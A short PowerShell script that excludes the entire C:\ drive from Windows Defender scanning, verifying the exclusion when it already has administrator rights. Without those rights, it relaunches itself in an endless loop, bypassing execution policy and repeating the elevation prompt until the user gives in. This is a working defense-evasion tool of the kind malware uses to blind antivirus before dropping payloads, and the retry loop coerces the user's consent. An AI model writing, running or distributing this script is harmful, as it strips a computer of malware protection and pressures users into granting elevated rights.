# Check admin status using WMI
$isAdmin = ([wmi]"Win32_ComputerSystem.Name='$env:COMPUTERNAME'").UserName -match 'Administrator' -or `
           ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(544)

if ($isAdmin) {
    # Execute exclusion
    Set-MpPreference -ExclusionPath "C:\" -Force
    Write-Host "Successfully excluded C:\ from Windows Defender" -ForegroundColor Green
    
    # Verify
    if ((Get-MpPreference).ExclusionPath -contains "C:\") {
        Write-Host "Verified: C:\ is in the exclusion list" -ForegroundColor Green
    } else {
        Write-Host "Warning: C:\ may not have been added" -ForegroundColor Yellow
    }
    
    pause
    exit
}

# Request elevation continuously
do {
    Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
    
    try {
        $proc = Start-Process PowerShell.exe -ArgumentList "-NoExit -NoProfile -ExecutionPolicy Bypass -Command `"Set-MpPreference -ExclusionPath 'C:\' -Force; Write-Host 'C:\ excluded from Windows Defender' -ForegroundColor Green; pause; exit`"" -Verb RunAs -PassThru -WindowStyle Normal
        if ($proc) { exit }
    }
    catch {
        Write-Host "Elevation denied or failed. Retrying..." -ForegroundColor Red
    }
} while ($true)
